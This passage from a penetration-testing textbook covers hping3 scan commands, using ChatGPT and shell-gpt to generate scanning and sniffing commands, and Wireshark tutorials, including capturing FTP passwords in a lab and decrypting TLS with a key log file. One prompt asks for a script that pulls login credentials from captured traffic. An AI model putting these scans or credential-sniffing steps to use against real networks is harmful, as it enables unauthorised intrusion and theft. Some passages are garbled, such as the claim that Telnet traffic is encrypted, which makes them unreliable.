• Description: Performs ICMP ping sweeps to identify live hosts. Works similar to the ping utility, sending ICMP echo requests and awaiting responses.

2. ACK Scan on Port 80

• Command: hping3 -A 10.0.0.25 -p 80

• Description: Probes the existence of firewalls and their rules. Returns an RST

response if the host is live and the port is open.

3. UDP Scan on Port 80

• Command: hping3 -2 10.0.0.25 -p 80

• Description: Sends UDP packets to check open ports. Returns an ICMP port

unreachable message for closed ports.

4. Collecting Initial Sequence Number

• Command: hping3 192.168.1.103 -Q -p 139

• Description: Collects TCP sequence numbers generated by the target host to iden-

tify predictable patterns.

5. Firewalls and Timestamps

• Command: hping3 -S 72.14.207.99 -p 80 --tcp- timestamp

• Description: Enables TCP timestamp option to analyze timestamp frequency and

update rates.

6. SYN Scan on Ports 50-60

• Command: hping3 -8 50-60 -S 10.0.0.25 -V

• Description: Performs SYN scan over a specified range of ports (50-60).

7. FIN, PUSH, and URG Scan on Port 80

• Command: hping3 -F -P -U 10.0.0.25 -p 80

• Description: Uses FIN, PUSH, and URG packets to identify open or closed ports.

8. Scan Entire Subnet for Live Hosts

• Command: hping3 -1 10.0.1.x --rand- dest -I eth0

• Description: Scans an entire subnet for live hosts using ICMP echo requests.

9. Intercept HTTP Signature Traffic

• Command: hping3 -9 HTTP -I eth0

• Description: Captures all packets containing HTTP signatures for analysis.

Hping Scan with AI

Artificial Intelligence (AI)-powered technologies can significantly enhance and automate network scanning tasks. By integrating AI with tools such as Hping3, attackers and security

analysts can perform highly efficient network scans to gather critical insights about target systems.

Example Use Case: AI, such as ChatGPT, can streamline the execution of Hping3 com-

mands with tailored prompts to automate scanning tasks, as shown in Figure 4.15.

Sample Prompt: “Use Hping3 to perform ICMP scanning on the target IP address

10.10.1.11 and stop after 10 iterations.”

The provided explanation for the command:

hping3 --icmp --count 10 10.10.1.11





118 Traditional vs Generative AI Pentesting

Figure 4.15 Use Hping3 to perform ICMP scanning on the target IP.

• hping3: This invokes the Hping3 tool, a network scanning and packet crafting utility.

• --icmp: This specifies the type of packet to send, which in this case is ICMP (Internet Control Message Protocol) packets. ICMP packets are typically used for network diagnostics and troubleshooting (e.g., ping tests).

• --count 10: This limits the number of ICMP packets sent to 10, meaning the tool will stop after sending 10 ICMP packets.

• 10.10.1.11: The target IP address to which the ICMP packets are being sent for testing or diagnostics.

Example 2

The example in the provided image illustrates how an attacker might use AI- generated

prompts, such as ChatGPT, to automate and optimize network scanning tasks. In this case,

the prompt directs the tool to (Figure 4.16):

“Run an hping3 ACK scan on port 80 of target IP 10.10.1.11”.

The command sudo hping3 --ack -p 80 10.10.1.11 is used for network scanning or test-

ing, leveraging specific parameters. Here is a detailed explanation of the command and its

components:

• sudo: Executes the command with administrative privileges, which is necessary for certain operations, such as sending raw packets.

• hping3: This is the command to invoke the Hping3 tool, a versatile network scanning and testing utility used for crafting and analyzing packets.

• --ack: Specifies the TCP ACK scan mode. This flag ensures that Hping3 sends TCP

packets with the ACK (Acknowledgment) flag set. ACK scans are useful for determining

if a specific port is open or closed and for firewall rule testing.

• -p 80: Specifies the destination port to which the TCP packets will be sent. In this example, it targets port 80, which is typically used for HTTP traffic.

• 10.10.1.11: Represents the target IP address where the TCP ACK packets will be sent for scanning or analysis.





GenAI-enhanced scanning and sniffing 119

Figure 4.16 Run a hping3 ACK scan on port 80 of target IP.

Metasploit

Metasploit is a powerful open- source penetration testing framework widely used by secu-

rity professionals to identify, validate, and exploit vulnerabilities in systems and networks (Kennedy et al., 2024). One of its key capabilities is network and vulnerability scanning, which can be performed as part of the reconnaissance and exploitation phases of a penetration test, as shown in Figure 4.17.

Figure 4.17 Metasploit port scan modules.





120 Traditional vs Generative AI Pentesting

Network sniffing

Packet Snnifing is the process of monitoring and capturing all data packets passing through a given network using a software application or hardware device. Sniffing is simple in hub-based networks because traffic on a segment passes through all hosts associated with that

segment. However, most of today’s networks work with switches (Ansari et al., 2003). A switch is an advanced computer networking device. The main difference between a hub and a

switch is that a hub transmits line data to each port on the machine and has no line mapping, whereas a switch looks at the MAC address (Media Access Control) system associated with

each frame that passes through it and sends the data to the required port. A MAC address

is a hardware address that uniquely identifies each node in a network (Ali et al., 2023a).

An attacker must manipulate the functionality of the switch to see all the traffic that passes through it. A packet sniffing program (also known as a “sniffer”) can capture data packets

only inside a given subnet, which means that it cannot sniff packets from another network.

Often, any laptop can plug into a network and access it (Ali et al., 2023b; Shaw & Parveen,

2024). The ports of many companies’ switches are open. A packet sniffer placed on a promiscuous network can therefore capture and analyze all network traffic. Sniffing programs

disable the filter used by Ethernet network interface cards (NICs) to prevent the host machine from seeing traffic from other stations.

Thus, sniffing programs can monitor all traffic. Although most networks today use switch

technology, packet sniffing is still useful. This is because it is relatively easy to install remote sniffing programs on network components with large traffic flows, such as servers and routers. This allows an attacker to observe and access all network traffic from a single point

(Bock, 2022; Rajawat et al., 2022). Packet sniffers can capture data packets containing sensitive information such as passwords, account information, syslog traffic, router configuration, DNS traffic, email traffic, web traffic, chat sessions, and FTP passwords. This allows an attacker to read plaintext passwords, real emails, credit card numbers, financial transac-tions, and more. It also allows an attacker to sniff SMTP traffic, POP, IMAP, IMAP, HTTP,

TELNET AUTHENTICATION, SQL DATABASE, SMB traffic, NFS to FTP. An attacker can

obtain a substantial amount of information by reading captured data packets; it can then use this information to break into the network. An attacker carries out attacks more effectively by combining these techniques with active transmission.

Figure 4.18 shows hacker sniffing data packets between two legitimate users on the network.

How a sniffer works

The most common way to network computers is through an Ethernet connection. A com-

puter connected to a local area network (LAN) has two addresses: a MAC address and an

Internet Protocol (IP) address (Dodiya & Singh, 2022). The MAC address uniquely identifies each node in the network and is stored on the network adapter itself. The Ethernet protocol uses the MAC address to transfer data to and from a system while building data frames.

The data link layer of the OS model uses an Ethernet header with the MAC address of the

destination machine instead of the IP address. The network layer is responsible for mapping the IP network addresses to the MAC address, as required by the data link protocol. It first looks up the MAC address of the destination machine in a table, usually called the Address

Resolution Protocol (ARP) cache). If there is no entry for the IP address, an ARP request

packet is broadcast to all machines in the local subnet. The machine with this particular

address responds to the source machine with its MAC address. The ARP cache of the source

machine adds this MAC address to the table. The source machine, in all its communications

with the destination machine, then uses this MAC address.





GenAI-enhanced scanning and sniffing 121

Figure 4.18 Sniffing scenario.

Types of sniffing

Attackers use sniffers to convert the host system’s network adapter to promiscuous mode. As discussed above, the promiscuous mode network adapter can then capture packets addressed

to the specific network. There are two types of sniffing. Each is used for different types of networks. The two types are.

Sniffing passive

Sniffing passive does not involve sending packets. It simply captures and monitors packets

circulating in the network. A packet sniffer alone is not preferable for an attack because

it only works in a common collision domain. A common collision domain is the sector of

the network that is not switched or bridged (i.e., connected by a hub). Common collision

domains are present in hub environments. A network that uses hubs to connect systems uses

passive sniffing. In these networks, all hosts on the network can see all traffic. This makes it easy to capture traffic through the hub using passive sniffing.

Sniffing active

Active sniffing searches for traffic on a dial- up network by actively injecting traffic into it.

Active sniffing also refers to sniffing through a switch. In active sniffing, Ethernet does not transmit information to all systems connected by the LAN as it does in a network based on a hub. Because of this, a passive sniffer is unable to sniff data on a dial- up network. It is easy to detect these sniffing programs and very difficult to perform this type of sniffing. The switches examine the data packets to determine source and destination addresses, and then forward

them to appropriate destinations. This makes it difficult to sniff switches. However, attackers can actively inject ARP traffic in a local network to sniff out a dial- up network and capture traffic. The switches maintain their own ARP cache in content- addressable memory (CAM).





122 Traditional vs Generative AI Pentesting

Addressable memory is a special type of memory that keeps a record of the host connected

to each port. A sniffer records all visible information on the network for later review. An attacker can see all the information in the packets, including data that should remain hidden.

To summarize the types of sniffing: passive sniffing does not send packets; it only monitors packets sent by others. Active sniffing is the process of sending multiple network probes to identify access points. Here is a list of the different active sniffing techniques:

• MAC Flood

• DNS poisoning

• ARP Poisoning

• Attacks DHCP

• Switch Port Voltage

• Spoofing attack

Protocols vulnerable to sniffing

The following protocols are vulnerable to sniffing. The main reason for sniffing these protocols is to get passwords.

• Telnet and Rlogin

Telnet is a protocol used to communicate with a remote host (via port 23) over a net-

work using a command- line terminal. rlogin allows an attacker to remotely connect

to a machine on the network via a TCP connection. None of these protocols provide

encryption.

As a result, data that flows between clients connected by one of these protocols is

protected by encryption.

Data flowing between customers connected by one of these protocols is therefore

protected by encryption and verification. Users can send emails, using usernames and

passwords.

• HTTP

Due to vulnerabilities in the default version of the HTTP protocol, websites that use

this protocol transfer user data over the network in the clear, which attackers can read

to steal the user’s credentials.

• SNMP

Simple Network Management Protocol (SNMP) is a TCP- based protocol/IP Used to

exchange management information between devices connected on a network. The first

version of SNMP (SNMPv1 and SNMPv2) does not offer strong security, which leads

to the transfer of data in the clear. Attackers exploit vulnerabilities in this version to

acquire plaintext passwords.

• SMTP

The SMTP protocol Simple Mail Transfer Protocol (Simple Mail Transfer Protocol) is

used to transmit e- mail messages over the internet. In most implementations, SMTP

messages are transmitted in the clear, which allows attackers to capture passwords

in the clear. In addition, the SMTP protocol does not provide any protection against

attacks by sniffing.

• NNTP

The Network News Transfer Protocol (NNTP) enables the distribution, querying,

retrieval, and publication of news articles using a reliable news transmission stream

within the ARPA- Internet community. However, this protocol does not encrypt data,

allowing attackers to sniff out sensitive information.





GenAI-enhanced scanning and sniffing 123

• POP

Post Office Protocol (POP) allows a user’s desktop to access mail from a Mailbox

server. A user can send mail from their workstation to the Mailbox server via SMTP.

Attackers can easily sniff data flowing over a POP network in clear text due to weak

security implementations of the protocol.

• FTP

File Transfer Protocol (FTP)) allows clients to share files between computers on a net-

work. This protocol does not provide encryption; therefore, attackers can sniff out

data, including user credentials, by running tools such as Cain & Abel.

• IMAP

Internet Message Access Protocol (IMAP) allows a client to access and manipulate

e- mail messages on a server. This protocol provides insufficient security, allowing

attackers to obtain data and user credentials in the clear.

Get Wireshark

Wireshark is installed on Kai Linux. You can simply launch the Kali Linux VM and open

Wireshark there. Wireshark can also be downloaded from the following website (Figure 4.19):

https:// www. wireshark. org/ download. html.

Demer's Wireshark

When you run the Wireshark program, the Wireshark graphical user interface is displayed as

shown in Figure 4.20. Currently, the program does not capture packets.

Next, you need to choose an interface. If you are running Wireshark on your laptop,

you need to select the WiFi interface. If you are on a desktop computer, you must select the Ethernet interface Used. Note that there can be multiple interfaces. In general, you can select any interface, but that doesn’t mean that traffic will go through that interface.

Figure 4.19 Wireshark download page.





124 Traditional vs Generative AI Pentesting

Figure 4.20 Wireshark initial GUI.

Figure 4.21 Capturing packets in Wireshark.

After selecting the interface, you can click start to capture the packets, as shown in

Figure 4.21.

GenAI-enhanced scanning and sniffing 125

Wireshark interface has five main components:

The Command menus are standard drop- down menus located at the top of the window.

What we’re interested in now are the File and Capture menus. The File menu allows you

to save captured packet data or open a file containing previously captured packet data,

and exit the Wireshark application. The Capture menu allows you to begin packet capture.

The package list window displays a one- line summary for each captured packet, including the packet number (assigned by Wireshark; it is not a packet number contained in the header

of a protocol), the time the packet was captured, the source and destination addresses of

the packet, the type of protocol, and the protocol- specific information contained in the

packet. The list of packages can be sorted into one of these categories by clicking on the

name of a column. The protocol type field lists the top- level protocol that sent or received this packet, that is, the protocol that is the ultimate source or sink of this packet.

The Package Header Details Window provides details about the selected package (high-

lighted) in the package list window. (To select a package in the package list window,

hover over the summary of a line of the package in the package list window and left-

click.) These details include information about the Ethernet frame and the IP datagram

that contain this packet. The amount of detail displayed on the Ethernet and IP layers

can be expanded or reduced by clicking the arrow pointing to the right or down to the

left of the Ethernet frame line or IP datagram in the packet details window. If the packet

was carried by TCP or UDP, TCP or UDP details will also be displayed, which can also

be expanded or collapsed. Finally, details about the higher- level protocol that sent or

received this packet are also provided. The Package Contents Window displays the full contents of the captured frame, in ASCII and hexadecimal format.

To the top of Wireshark’s GUI, is located on Packet Display Filter Field, in which a protocol name or other information can be entered in order to filter the information dis-

played in the packet list window (and thus in the packet header and contents windows).

In the example below, we’ll use the packet display filter field to have Wireshark hide

(not show) packets except those that match HTTP messages.

Column headers

• No: Each package is assigned a number. It’s simply a meter.

• Time: The timestamp of the packet. That is, the time that has passed since you started

capturing. You can change this time format by going to “Display > Time Display Format

>…”.

• Source: The source address of the packet, which can be an IP or MAC address. As

humans, we find this easier when the IP or MAC address is an actual name, such as “

www. google. com” or “ www. yahoo. ca”. You can enable the option of Wireshark to convert these addresses by going to “View > Name Resolution > Resolve Network

Addresses.”

• Destination: The destination address of the packet can be an IP or MAC address.

• Protocol: The name of the protocol used in the packet. The term “protocol” refers to “a

set of rules governing the format of data sent over the Internet or other network.” Click

here for a full list.

• Length: The total length of the package.

• Info: Provides additional details about the package.

The information display is only a quick overview of the nature of the packet. For more

details, go to the Drill down panel and the Bytes panel for more details on packet flags,

source and destination ports, HTTP form data, and more!





126 Traditional vs Generative AI Pentesting

Packet color coding

Each of the packets in the main view is color- coded so we can easily understand what it

means. This can be changed by going to Display > Coloring Rules. You can also add your

own coloring rules, for example, if you want all packets with an inbound IP address that

matches x.x.x.x to be blue, as shown in Figure 4.22.

Packet filtering in Wireshark

A large part of the network traffic is picked up by Wireshark and most of them will be useless

to us for the moment (Soepeno, 2023). With the help of filtering, we can quickly access the interesting elements, as illustrated in Table 4.3 and Table 4.4.

• To try some of the filters below, paste them into the “filter bar” at the top of the

Wireshark capture page.

• Click on “Expressions” to see all possible filter options. The list goes on.

• As a regular user of Wireshark, there may be some commands that you use often. Save

your own custom filters for quick access by clicking the “+” button. Give it a name and

it will appear next to the “+” button, so next time you can easily apply the filter with

just one click. Another easy way to apply filters is to right- click on a package <“Apply as a filter>…” and choose from the many options offered, as shown in Figure 4.23.

• Relationships with Wireshark filters

• Wireshark - Combination of expressions

Figure 4.22 Color- coding of packets on Wireshark.



GenAI-enhanced scanning and sniffing 127

Table 4.3 Filters Wireshark

English

C- like

Description and example

Eq

==

Equal. ip.src==10.0.0.5

Not

!=

Not equal. ip.src!=10.0.0.5

Gt

>

Greater than. frame.len > 10

Lt

<

Less than. frame.len < 128

Ge

>=

Greater than or equal to. frame.len ge 0x100

The

<=

Less than or equal to. frame.len ⇐ 0x20

Contains

Protocol, field or slice contains a value. sip. To contains

“a1762”

Matches

~

Protocol or text field match Perl regualar expression.http.

host matches “acme\. (org|com|net)”

bitwise_and

&

Compare bit field value. tcp.flags & 0x02

Table 4.4 Combinaison d’expression Wireshark

English

C- like

Description and example

And

&&

Logical AND. ip.src==10.0.0.5 and tcp.flags.fin

Or

||

Logical OR. ip.scr==10.0.0.5 or ip.src==192.1.1.1

Xor

^^

Logical Ser. TR.DST[0:3] == 0.6.29 Sar TR.SRC[0:3] ==0.6.29

Not

!

Logical NOT. not llc

[…]

Slice Operator. eth.addr[0:3]==00:06:5B

In

Membership Operator. tcp.port in {80 443 8080}

Figure 4.23 Filter application on Wireshark.





128 Traditional vs Generative AI Pentesting

Try some of the following filters.

Source IP Filter: ip.src == 192.168.1.1

Destination IP Filter: ip.dst == 192.168.1.1

Filtering with Logic:

-----------+------------

AND | and, &&

OR | or, ||

EQUALS | eq, ==

NOT EQUALS | !=

Examples:

tcp contains 01:01:04

tcp.port eq 25 or icmp

ip.addr == 10.43.54.65

! ( ip.addr == 10.43.54.65 )

Some popular filters:

tcp.port == 443

tcp.analysis.flags

! (arp or icmp or dns)

follow tcp stream

tcp contains facebook

http.response.code == 200

http.request

Attack and defend with Wireshark

Sniffing is a form of attack. You are looking to obtain sensitive information such as credentials when a person logs in or registers on a website. You can also find out what websites

someone visits, what files they transfer, or what apps they use by reliant Wireshark to your

router.

How do you catch a network scan attack?

Step 1: You will notice a lot of lost packages (labeled [RST ACK]), as shown in Figure 4.24.

Step 2: Go to

Statistics > IPv4 Stats > Source and Destination Addresses; and sort by number. If a specific IP

address has a high number and you don’t know the source IP, it’s most likely attacking your system. At this point, you can make the necessary changes to block them. Figure 4.25 IPv4

statistics on Wireshark.

How do I detect running local services (accessible to the web)?

1. Find the destination port ID in packet details > Transmission Control Protocol

2. Open the terminal, run

sudo lsof -i:PORT#

(replace 'PORT#' with the actual port number).

a. LSOF

The meaning of “LiSt Open Files” is used to know which files are opened by which

process.

3. Find the PID, open the Activity Monitor, and find the PID.





GenAI-enhanced scanning and sniffing 129

Figure 4.24 Packets lost on Wireshark.

Figure 4.25 IPv4 statistics on Wireshark.





130 Traditional vs Generative AI Pentesting

Creating firewall rules

Select a package for which you want to create a firewall rule. Then click Tools > Firewall ACL Rules. The first rule is generated by Wireshark. Feel free to modify it to suit your needs.

Packet capture

After downloading and installing Wireshark, you can launch it and click on the name of an

interface under Interface List to start capturing packets on that interface. For example, if you want to capture traffic on the wireless network, click your wireless interface.

HTTP traffic

Perform the following steps:

1. Launch the Wireshark program (select an interface and press Start to capture packets).

2. Launch your favorite browser.

3. In your browser, go to the http2demo homepage by typing http:// www. wayne. edu/.

4. Once your browser has rendered the page http:// www. wayne. edu/, stop Wireshark packet capture by selecting stop in the Wireshark capture window. The Wireshark capture window will disappear and the main Wireshark window will display all the pack-

ages captured since you started the packet capture.

5. Color coding: You’ll likely see packets highlighted in green, blue, and black. Wireshark uses colors to help you identify traffic types at a glance. By default, green corresponds

to TCP traffic, dark blue to DNS traffic, light blue to UDP traffic and black identifies

TCP packets with problems – for example, they may have been delivered out of order.

6. You now have live packet data that contains all the protocol messages exchanged

between your computer and other entities on the network! However, as you can see,

HTTP messages are not clearly displayed because many other packages are included

in the package capture. Even if the only action you took was to open your browser,

there are many other programs in your computer that communicate through the net-

work in the background. To filter the connections we want to focus on, we need to use

Wireshark’s filtering feature by typing “http” in the filter field as shown in Figure 4.26.

Notice that we now only see packets that are from the HTTP protocol. However, we

still don’t have the exact communication we want to focus on because using HTTP as a fil-

ter isn’t descriptive enough to allow us to find our connection to http:// www. http2demo.

io. We need to be more precise if we want to capture the correct set of packets.

7. To further filter packets in Wireshark, we need to use a more precise filter. By setting

http.host== www. http2demo. io, we limit the display to packets whose http host is the

website www. http2demo. io. Note that we need two equal signs to match “==” and not just one. See the screenshot in Figure 4.27.

8. Now we can try another protocol. Let’s take the example of the DNS protocol (Domain

Name System), as shown in Figure 4.28.

9. Now let’s try to find out what these packets contain by following one of the conversa-

tions (also known as network flows), select one of the packets and press the right mouse

button (if you’re on a Mac, use the command button and click), you should see some-

thing similar on the screen in Figure 4.29.

Click Follow UDP Stream and you’ll see the following screen, as shown in Figure 4.30.





GenAI-enhanced scanning and sniffing 131

Figure 4.26 Filter traffic HTTP on Wireshark.

Figure 4.27 Advanced HTTP filter on Wireshark.

10. If we close this window and change the filter to “http.host== www. http2demo. io”, then let’s follow a package from the list of packages that match this filter. We should get

something similar to the following screens in Figures 4.31 and 4.32. Notice that we click on Follow TCP Stream this time.





132 Traditional vs Generative AI Pentesting

Figure 4.28 DNS traffic filter on Wireshark.

Figure 4.29 Tracking the UDP flow of DNS traffic.





GenAI-enhanced scanning and sniffing 133

Figure 4.30 DNS traffic UDP flow.

Figure 4.31 Tracking the TCP flow of HTTP traffic.





134 Traditional vs Generative AI Pentesting

Figure 4.32 HTTP Traffic TCP flow.

Traffic FTP

File Transfer Protocol (FTP)) typically uses TCP ports/20 or TCP/21. Although this protocol is very old, some organizations still use it in their networks. FTP is a plain- text protocol, so a well- positioned attacker can capture FTP login credentials with Wireshark very easily. The

screenshot in Figure 4.33 shows, as an example, an FTP password captured with Wireshark.

Figure 4.33 FTP session on Metasploitable 2.





GenAI-enhanced scanning and sniffing 135

Figure 4.34 Capturing FTP traffic.

In this example we have initiated an FTP session between our Kali Linux machine and an

FTP server available on the Metasploitable 2 machine:

We run Wireshark in parallel to capture FTP traffic, as shown in Figure 4.34.

As you can see by placing ourselves in a network, we can easily capture FTP credentials

(Figure 4.35).

Traffic HTTPS

HTTP messages are generally not sent in the clear over the internet. Instead, TLS is used

to provide security for communications against tampering and monitoring of HTTP- based

communications. TLS itself is a fairly complex protocol made up of several subprotocols, but let’s think of it as an encrypted and authenticated layer on top of the TCP connection that also performs a verification of the server (and possibly the client) via public- key cryptography. Figure 4.36 show an example of capturing HTTPS traffic.

Step 1: Set an SSLKEYLOGFILE environment variable

In Windows systems, you’ll need to set an environment variable using the Advanced System

Settings utility. This variable, named SSLKEYLOGFILE, contains a path where pre- master

secret keys are stored.





136 Traditional vs Generative AI Pentesting

Figure 4.35 Capture du traffic FTP.

Figure 4.36 Capturing HTTPS traffic.

On Linux/Unix that uses Bash, we could simply put the following line in the ~/.bashrc or

~/.bash_profile file:

export SSLKEYLOGFILE=~/.sslkeyfile

Before we run Wireshark to collect packets, we need to verify that we are logging session

keys. We open Firefox and type in the address bar any domain that uses https. I’m going to

type https:// www. example. com. Now it’s time to check the log file.





GenAI-enhanced scanning and sniffing 137

Figure 4.37 Capture of Wireshark on example. com.

We don’t want to capture all the packets going in and through our interface, so we create

a capture filter as below. I will use the domain name example. com as shown in Figure 4.37.

You can also use an IP address instead of a domain name. Then choose the interface from

which you want to capture traffic.

Step 2: Configuring Wireshark to Decrypt SSL/TLS

We’re ready to set up Wireshark now. It’s pretty simple. All we have to do is go to (Edit ->) Preferences -> Protocols -> TLS and put the value of SSLKEYLOGFILE in “(Pre- )Master

Secret Log filename.” You must also select the check boxes for reassembling TLS records and application data, as shown in Figure 4.38.

Figure 4.38 SSL upload with (pre)-master- secret log filename.

138 Traditional vs Generative AI Pentesting

Analyze packets before and after decryption with Wireshark

Wireshark will open a text field at the top to allow you to enter a path to the file it needs to read for decryption, as shown in Figure 4.39.

As illustrated in Figure 4.40, we can now see decrypted HTTPS messages. This includes some API calls that Google Chrome makes when it calls back the mothership, as well as

requests to the Discord backend from a desktop Discord client.

To see more details, we can click on the line (packet) that contains the http GET request.

As seen in Figure 4.41, our request uses http version 2, GET method, showing the details of the domain we connected and much more about the request.

SSL and TLS are both cryptographic protocols that provide authentication and encryption

of data between clients and servers. Sometimes we need requests to be in plain text format.

Wireshark is a great tool for cracking SSL/TLS into data in the form of clear text.

1. Capture HTTP Traffic

Prompt:

sgpt --chat sniff --shell “Create a Wireshark command to capture only HTTP traffic on

a specific interface (e.g., eth0) and save it to a file named http_traffic.pcap.”

2. Capture Traffic from a Specific IP Address

Prompt:

sgpt --chat sniff --shell “Generate a Wireshark filter to capture traffic to and from IP

192.168.1.1 and save it to a file named ip_traffic.pcap.”

3. Capture DNS Queries

Prompt:

sgpt --chat sniff --shell “Write a Wireshark command to capture only DNS query pack-

ets on the network and save them to dns_traffic.pcap.”

4. Filter HTTPS Traffic

Prompt:

sgpt --chat sniff --shell “Create a Wireshark command to capture HTTPS traffic only on

port 443 and save it to a file named https_traffic.pcap.”

5. Analyze Traffic in Real- Time

Prompt:

sgpt --chat sniff --shell “Generate a command to capture and display live HTTP traffic

in Wireshark’s command- line mode (tshark).”

6. Extract Credentials from Captured HTTP Traffic

Prompt:

sgpt --chat sniff --shell “Create a script to capture HTTP traffic, filter packets contain-

ing login credentials, and save the output to a log file.”

7. Capture All Traffic and Limit Packet Count

sgpt --chat sniff --shell “Generate a Wireshark command to capture all network traffic,

but limit it to 100 packets, saving it to a file named limited_traffic.pcap.”

8. Use Wireshark to Debug VoIP Traffic

Prompt:

sgpt --chat sniff --shell “Write a Wireshark command to capture SIP traffic for VoIP

debugging on interface eth0.”

9. Capture Traffic on a Specific Subnet

Prompt:

sgpt --chat sniff --shell “Generate a Wireshark command to capture all traffic in the

192.168.1.0/24 subnet and save it to a file named subnet_traffic.pcap.”



GenAI-enhanced scanning and sniffing

Figure 4.39 Reading (pre)-master- secret log file by Wireshark.

139



140

Traditional vs Generativ

e AI P

entesting

Figure 4.40 Decrypted HTTPS messages.



GenAI-enhanced scanning and sniffing

Figure 4.41 Decrypted information about Wireshark.

141





142 Traditional vs Generative AI Pentesting

10. Capture Only ICMP Packets (e.g., Ping)

Prompt:

sgpt --chat sniff --shell “Write a command to capture only ICMP packets (like ping

requests) and display them live in the terminal.”

CONCLUSION

This chapter underscores the importance of effective network scanning and sniffing in pene-

tration testing and cybersecurity. Through step- by- step instructions and tool demonstrations, readers will learn how to actively and passively gather critical information about target systems. The chapter highlights the integration of modern AI techniques to simplify and enhance scanning processes, demonstrating how tools such as Wireshark and Nmap can uncover

vulnerabilities and analyze network traffic. This knowledge equips cybersecurity professionals with the necessary skills to detect, mitigate, and secure systems against potential threats, forming a vital foundation for advanced penetration testing and vulnerability assessment

explored in subsequent chapters.

REFERENCES

Ali, M. L., Ismat, S., Thakur, K., Kamruzzaman, A., Lue, Z., & Thakur, H. N. (2023a). Network packet

sniffing and defense. 2023 IEEE 13th Annual Computing and Communication Workshop and

Conference (CCWC), 499–503.

Ali, M. L., Ismat, S., Thakur, K., Kamruzzaman, A., Lue, Z., & Thakur, H. N. (2023b). Network packet

sniffing and defense. 2023 IEEE 13th Annual Computing and Communication Workshop and

Conference (CCWC), 499–503.

Ansari, S., Rajeev, S. G., & Chandrashekar, H. S. (2003). Packet sniffing: a brief introduction. IEEE

Potentials, 21(5), 17–19.

Bock, L. (2022). Learn Wireshark: A Definitive Guide to Expertly Analyzing Protocols and

Troubleshooting Networks Using Wireshark. Packt Publishing Ltd.

Dodiya, B., & Singh, U. K. (2022). Malicious Traffic analysis using Wireshark by collection of Indicators

of Compromise. International Journal of Computer Applications, 183(53), 1–6.

Glăvan, D., Răcuciu, C., Moinescu, R., & Eftimie, S. (2020). Sniffing attacks on computer networks.

Scientific Bulletin “Mircea Cel Batran” Naval Academy, 23(1), 202A – 207.

Gregorczyk, M., Żórawski, P., Nowakowski, P., Cabaj, K., & Mazurczyk, W. (2020). Sniffing detection

based on network traffic probing and machine learning. IEEE Access, 8, 149255–149269.

Hwang, Y.-W., Lee, I.-Y., Kim, H., Lee, H., & Kim, D. (2022). Current status and security trend of osint.

Wireless Communications and Mobile Computing, 2022.

Kennedy, D., Aharoni, M., Kearns, D., O’Gorman, J., & Graham, D. G. (2024). Metasploit. No Starch

Press.

Lyon, G. (2011). Nmap Network Mapper.

Maleh, Y. (2021). IT/OT convergence and cyber security. Computer Fraud & Security, 2021(12), 13–

16. https://doi.org/10.1016/S1361- 3723(21)00129- 9

Maleh, Y. (2024). Web Application PenTesting: A Comprehensive Guide for Professionals. CRC Press.

Rajawat, S. S., Khatri, P., & Surange, G. (2022). Sniffit: A Packet Sniffing Tool Using Wireshark.

International Conference on Communication, Networks and Computing, 203–212.

Sadqi, Y., & Maleh, Y. (2022). A systematic review and taxonomy of web applications threats.

Information Security Journal: A Global Perspective, 31(1), 1–27. https://doi.org/10.1080/19393555.

2020.1853855

Shaw, R., & Parveen, S. (2024). Literature Review on Packet Sniffing: Essential for Cybersecurity &

Network Security. 2024 5th International Conference on Intelligent Communication Technologies

and Virtual Mobile Networks (ICICV), 715–719.

GenAI-enhanced scanning and sniffing 143

Soepeno, R. A. A. P. (2023). Wireshark: An Effective Tool for Network Analysis.

Tabatabaei, F., & Wells, D. (2016). OSINT in the Context of Cyber- Security. Open Source Intelligence

Investigation: From Strategy to Implementation, 213–231.

Velu, V. K. (2022). Mastering Kali Linux for Advanced Penetration Testing: Become a cybersecurity

ethical hacking expert using Metasploit, Nmap, Wireshark, and Burp Suite. Packt Publishing Ltd.

Zaydi, M., & Maleh, Y. (2024). Empowering red teams with generative AI: Transforming penetration testing through adaptive intelligence. EDPACS, 1–26. https://doi.org/10.1080/07366981.2024.

2439628





Chapter 5

Vulnerability assessment

Tools, techniques, and GenAI integration

INTRODUCTION

This chapter offers a comprehensive overview of cybersecurity vulnerability classification, research, assessment, and management techniques, essential for safeguarding information

technology environments against evolving cyber threats (Cascavilla et al., 2021). It begins with a detailed classification of common vulnerabilities, ranging from misconfigurations and default installations to more complex issues such as buffer overflows and zero- day vulnerabilities (Last, 2016). This classification not only aids cybersecurity professionals in identifying and understanding potential weaknesses but also serves as a roadmap for effectively prioritizing and addressing these risks. The discussion then transitions to vulnerability research, highlighting its significance in gathering security intelligence, discovering system weaknesses, and preparing for recovery from attacks. This section underscores the importance of proactive vulnerability identification and categorization based on severity and potential exploitation range, thus enabling network administrators to fortify defenses against imminent cyber threats. Subsequently, the chapter delves into vulnerability assessment—a critical examination of systems or applications to identify, measure, and classify security vulnerabilities. It describes the process as a cornerstone of IT security, enabling organizations to pinpoint and remediate vulnerabilities before they can be exploited. Characteristics of a good vulnerability assessment solution are outlined, emphasizing accuracy, comprehensive testing, and action-

able reporting as key features (Sadqi & Maleh, 2022).

Moreover, the chapter discusses various vulnerability assessment systems and databases,

such as the Common Vulnerability Scoring System (CVSS), Common Vulnerabilities and

Exposures (CVE), and the National Vulnerability Database (NVD), which provide stan-

dardized frameworks for communicating and managing cybersecurity vulnerabilities. The

narrative also explores different vulnerability assessment tools, including Nessus, Rapid7

Nexpose, OpenVAS, and Nikto, detailing their functionalities, installation processes, and

how they can be employed to conduct thorough vulnerability assessments. Each tool’s unique

features and capabilities are examined, offering insights into their suitability for different assessment needs.

The chapter concludes with a synthesis of vulnerability research, assessment, and manage-

ment, reiterating the importance of these processes in building a robust security posture.

It stresses the need for continuous monitoring, regular updates, and strategic planning to

mitigate the risk of cyber- attacks effectively. This comprehensive exploration of cybersecurity vulnerabilities and their management provides invaluable knowledge for cybersecurity professionals, network administrators, and IT personnel tasked with safeguarding digital assets against the ever- changing landscape of cyber threats.

144

DOI: 10.1201/9781003640318-5





Vulnerability assessment 145

BACKGROUND

Vulnerability

Vulnerability refers to a weakness in a computer system, network, or application that, when exploited by a threat, can lead to a security breach (Ledwaba & Venter, 2017). This can include flaws in the system which allow an attacker to access system resources without

authorization, execute commands in an undesired way, or access confidential information.

Vulnerabilities can result from various factors, such as programming errors, incorrect con-

figurations, or inadequate security measures (ETSI, 2011). Identifying and mitigating these vulnerabilities is crucial for protecting systems against malicious attacks and intrusions.

• Improper configuration of hardware or software

• Inadequate or insufficiently secure network and application design

• Lack of end- user vigilance

• Inherent technological weaknesses.

Vulnerability classification

